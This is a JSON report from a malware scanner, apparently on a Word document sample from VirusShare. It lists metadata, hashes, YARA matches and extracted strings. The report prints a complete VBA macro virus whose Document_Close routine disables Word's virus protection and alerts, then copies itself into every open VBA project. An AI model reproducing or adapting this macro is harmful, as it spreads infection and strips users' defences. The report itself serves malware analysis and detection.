{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n'Copyright (C) 1998 by FlyShadow ~^^~ - 17th\nPrivate Sub Document_Close()\nOn Error Resume Next\nOptions.VirusProtection = 0\nOptions.SaveNormalPrompt = 0\nApplication.DisplayAlerts = 0\nApplication.ScreenUpdating = 0\nApplication.EnableCancelKey = 0\nSet Ј\\ = VBE.VBProjects\nFor Јd = 1 To Ј \\ .Count\nIf Ј\\(Јd).Protection <> 1 And Ј\\(Јd).Description <> \"17th\" Then\nЈ\\(Јd).Description = \"17th\"\nSet Јo = Ј\\(Јd).VBComponents(1).CodeModule\nЈo.DeleteLines 1, Јo.CountOfLines\nЈo.AddFromString VBProject.VBComponents(1).CodeModule.Lines(1, 17)\nEnd If: Next\nEnd Sub\n"
    },
    "filename": "VirusShare_317098c3ab217af82fed11181c0cd9a7",
    "filesize": 39424,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1251, Title: Copyright  1998 by FlyShadow ~^^~, Author: FlyShadow, Template: Normal.dot, Last Saved By: ZERTVA, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Thu May 13 23:47:00 2004, Last Saved Time/Date: Thu May 13 23:47:00 2004, Number of Pages: 1, Number of Words: 1196, Number of Characters: 6821, Security: 0",
    "hashes": {
        "md5": "317098c3ab217af82fed11181c0cd9a7",
        "sha1": "cb51257c8fd71c2b7dc64e9f24d00d1b75dd5c5f",
        "sha256": "104a68cbb21b8a522298220cb1563117b363411bcb0d789a09ab482557155bc3"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "MDT<9",
            "TestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTesttest",
            "Test",
            "Test",
            "Test",
            "test",
            "Test",
            "Test",
            "Test",
            "test",
            "test",
            "Test",
            "test",
            "SOFTWARE LICENSE AGREEMENT",
            "*** Please read this entire agreement ***",
            "LICENSE:",
            "* This Limited Use Software License Agreement (the \"Agreement\") is a legal agreement between you (\"Licensee\"), the end-user, and Headlight Software, Inc (\"Headlight\") for the use of the GetRight software product (\"Software\").  ",
            "By using this software or storing this program on a computer hard drive (or other media), you are agreeing to be bound by the terms of this Agreement.  ",
            "If you do not agree to the terms of this Agreement, and you have registered this software, promptly return the software and the accompanying items (including any written materials), along with your receipt for a full refund; or delete the software from all storage media. ",
            "* You may install this program to test and evaluate if it suits your needs and you wish to purchase it; during the evaluation period, you will be shown advertising banners within the GetRight program.  There is not a set limit for the evaluation time.",
            "* This software may be distributed freely on online services, bulletin boards, or other electronic media as long as the files are distributed in their entirety.  This software may not be distributed on CD-ROM, disk, or other physical media for a fee without the permission of Headlight Software, Inc.",
            "* You may not alter this software in any way, including changing or removing any messages or windows.  ",
            "* You may not decompile, reverse engineer, disassemble or otherwise reduce this software to a human perceivable form.  You may not modify, rent or resell for profit this software, or create derivative works based upon this software.  ",
            "You may not publicize or distribute any registration code algorithms, information, or registration codes used by this software without permission of Headlight Software, Inc.",
            "You may not use any registration codes for the Software that have not been purchased from Headlight or an authorized representative of Headlight.",
            "* You accept responsibility for any network usage costs or any other costs incurred by using this software.",
            "-----------------------------------------",
            "NO WARRANTIES.  - Headlight EXPRESSLY DISCLAIMS ANY WARRANTY for the SOFTWARE. The SOFTWARE and any related documentation is provided \"as is\" without warranty of any kind, either express or implied, including, without limitation, the implied warranties or merchantability, fitness for a particular purpose, or noninfringement. ",
            "The entire risk arising out of use or performance of the SOFTWARE remains with you.",
            "THIS SOFTWARE IS NOT FAULT TOLERANT AND SHOULD NOT BE USED IN ANY ENVIRONMENT WHICH REQUIRES THIS.",
            "NO LIABILITY FOR DAMAGES. In no event shall Headlight or its suppliers be liable for any damages whatsoever (including, without limitation, damages for loss of business profits, business interruption, loss of business information, or any other pecuniary loss) arising out of the use of or inability to use this SOFTWARE, EVEN IF HEADLIGHT HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES. ",
            "Headlight may show advertisements and/or offers for other products in the Software.  Headlight has no ownership interest in these other products, services, or other advertised items.  And as such makes no warranty, either express or implied, as to these other products, services, or other advertised items and the use thereof.",
            "The Software will show advertisements to unregistered users.  Registered users may may turn on or off the display of advertising banners.  If advertisements are ever shown, you agree that you understand that this software will use your Internet connection to download these advertisements.  ",
            "If advertisements are shown, Headlight will use an embedded Internet Explorer web browser control for downloading and displaying these advertisements. ",
            "COPYRIGHT:",
            "* GetRight is Copyright Headlight Software, Inc.  You must treat the Software like any other copyrighted material.",
            "=========================================",
            "Headlight can use the Aveo Attune product support system.  The end-user license agreement for the Aveo Attune system is below.",
            "You are given the option to install or not install the Aveo Attune product support system later in this setup program.",
            "The Aveo Attune product support system will only be installed if you check the item later in this installer to indicate you do want the Attune product installed.",
            "=========================================",
            "SOFTWARE LICENSE AGREEMENT and LIMITED WARRANTY",
            "By using this software program (the \"Software\") you agree to be bound by all the terms and conditions of this license agreement. This license is effective until terminated. If you do not accept or agree to these terms you may terminate the license at any time by removing the Software from the memory of the computer on which the Software has been installed. This license will be terminated immediately and without notice in the event that you fail to comply with any term or condition hereof.",
            "Aveo Inc. (\"Aveo\") grants you (\"Licensee\") a non-exclusive license to use the Software with a single computer at a single location. This license is not a sale of the Software or any copy thereof. Aveo retains title and ownership of the Software and all copies, regardless of the form or media on or in which the original or any copy may exist. Aveo retains all rights to the Software and accompanying documentation (the \"Documentation\") not specifically granted to Licensee. The Software and the Documentation are copyrighted. Licensee may not copy, or encourage or allow copying of, the Software or Documentation.",
            "By accepting this Agreement, you understand and accept that the Software is designed to automatically download updates to the Software when you are connected to the Internet, and will establish the legitimate source of the Software with the Attune Server.  This automatic updating will occur in the background while you are connected.  It can be disabled, at your discretion, although the default configuration is to allow updates.  If you want to disable this feature, right-click on the Attune system application tray icon and choose \"Disable Attune.\"  This icon is typically found on the right-hand side or bottom of the start menu taskbar.",
            "You may not modify, reverse-engineer, decompile, create other works from, or disassemble the software. Similarly, you may not copy, modify, adapt or create other works based upon the Documentation. You may not transfer, convey, rent, sublicense or otherwise distribute the Software or Documentation, or any rights therein to any person or entity. Any attempt to distribute the Software or Documentation shall be void.",
            "THIS SOFTWARE IS LICENSED \"AS IS.\" AVEO MAKES NO WARRANTIES, EXPRESSED OR IMPLIED, INCLUDING WITHOUT LIMITATION THE IMPLIED WARRANTIES OF MERCHANTABILITY OF FITNESS FOR A PARTICULAR PURPOSE, REGARDING THE SOFTWARE. AVEO DOES NOT WARRANT, GUARANTEE OR MAKE ANY REPRESENTATIONS REGARDING THE USE OR THE RESULTS OF THE USE OF THE SOFTWARE IN TERMS OF ITS CORRECTNESS, ACCURACY, RELIABILITY, CURRENTNESS OR OTHERWISE. THE ENTIRE RISK AS TO RESULTS AND PERFORMANCE OF THE SOFTWARE, AND ITS INTERACTION WITH OTHER EQUIPMENT OR SOFTWARE OWNED OR USED BY YOU, IS ASSUMED BY YOU. THE EXCLUSION OF IMPLIED WARRANTIES IS NOT PERMITTED BY SOME STATES. THE ABOVE EXCLUSION MAY NOT APPLY TO YOU.",
            "IN NO EVENT WILL AVEO, AND ITS DIRECTORS, OFFICERS OR AGENTS (COLLECTIVELY AVEO) BE LIABLE TO YOU FOR ANY CONSEQUENTIAL, INCIDENTAL OR INDIRECT DAMAGES (INCLUDING DAMAGES FOR LOSS OF BUSINESS PROFITS, BUSINESS INTERRUPTION, LOSS OF BUSINESS INFORMATION, AND THE LIKE) ARISING OUT OF THE USE OR THE INABILITY TO USE THE SOFTWARE EVEN IF AVEO INC. HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES. BECAUSE SOME STATES DO NOT ALLOW THE EXCLUSION OR LIMITATION OF LIABILITY FOR CONSEQUENTIAL DAMAGES, THE ABOVE LIMITATIONS MAY NOT APPLY TO YOU.",
            "Aveo's liability to you for actual damages from any cause whatsoever, and regardless of the form of action (whether in contract, tort (including negligence), product liability or otherwise), will be limited to $50.",
            ". A!",
            "N}U&<r",
            "opop",
            " \" % & ' 2 t%",
            "0013468:<>@BDOPQRTUVWZ\\^",
            "0579;=?ACY[]",
            "Copyright  1998 by FlyShadow ~^^~",
            "FlyShadow",
            "Normal.dot",
            "ZERTVA",
            "Microsoft Word 8.0",
            "Copyright  1998 by FlyShadow ~^^~",
            "_PID_GUID",
            "MDT<9",
            "&;T<9",
            "MDT<9",
            "&;T<9",
            "MDT<9",
            "Project",
            "x17th@",
            "9stdole",
            ")*\\G{00020430-",
            "6}#2.0#0",
            "#C:\\CWIN",
            "95\\SYSTE",
            "M\\STDOLE@2.TLB#",
            "Automati$onC",
            "Forms>",
            "E91C7",
            "0FC3-A54",
            "8-11D8-8",
            "C4BEC297`1DB84E",
            "3.TW",
            "D#MicrosPoft ",
            "= _ ",
            "Ob Libr8ary",
            "P8,PJ@P\\VBE\\(E",
            "X(.E",
            "xN@Ual",
            "xNTax",
            " 5+\t,C",
            "Q7#fOffDic",
            "2DF8D04C",
            "-5BFA-101B-BDE5",
            "fTAA",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHk# 8.0k",
            "ThisDoc@ument",
            "@1Ti",
            "*\\CNormalrU",
            "Project",
            "ThisDocument",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\CWIN95\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "Document",
            "Document_Close",
            "17th",
            ")qۄT",
            "Copyright (C) 1998 by FlyShadow ~^^~ - 17th",
            "Set \\ = VBE.VBProjects",
            "If \\(d).Protection <> 1 And \\(d).Description <> \"17th\" Then",
            "\\(d).Description = \"17th\"",
            "Set o = \\(d).VBComponents(1).CodeModule",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "'Copyr",
            "ight (C)",
            " 1998 by",
            " FlyShad",
            "ow ~^^~ ",
            "- 17th",
            "4 Sub ",
            "On Erro r Res",
            "ptio",
            "ns.VirusProtec",
            "Save",
            "Appl",
            ".Dis",
            "ryAlerts",
            "ScreenU$pd",
            "|CancelK",
            "Set ",
            "VBE.VB",
            "A[1 To ",
            " \\ .Coun\t@3If@",
            "2<> 1 ",
            "DescTri= ",
            " Then",
            "$D\tVBCom",
            "s(1)",
            "!deModul",
            "o.Dele",
            "teLines 1, @",
            "B)Of",
            "o.AddFromSE8@;U",
            "uEq5If:",
            "540a3fae4",
            "WordS10",
            "VBA0",
            "Win16",
            "Win32",
            "Mac0",
            "Project-0",
            "stdole`0",
            "MSFormsC",
            "Normal0",
            "Office",
            "ThisDocument<0",
            "_Evaluate",
            "Document_Close7\\0",
            "Options0",
            "VirusProtectionoD0",
            "SaveNormalPromptʼ0",
            "Application*0",
            "DisplayAlerts0",
            "ScreenUpdating!",
            "EnableCancelKey0",
            "Count0v0",
            "DeleteLines",
            "CountOfLines!\\0",
            "AddFromString0",
            "VBProjectOh0",
            "VBComponents",
            "CodeModule",
            "Lines0",
            "Documentj0",
            "ID=\"{C635593A-DCB8-45E2-A873-546B111586CD}\"",
            "Document=ThisDocument/&H00000000",
            "HelpFile=\"\"",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "Description=\"17th\"",
            "CMG=\"6E6CBF5343AFB5B3B5B3B5B3B5B3\"",
            "DPB=\"DCDE0DC1152E162E162E\"",
            "GC=\"4A489B7708780878F7\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 362, 267, Z",
            "ThisDocument",
            " Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            "MDT<9",
            "MDT<9"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen"
        },
        "fuzzing": {
            "String too long": [
                "TestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTestTesttest"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.318261",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
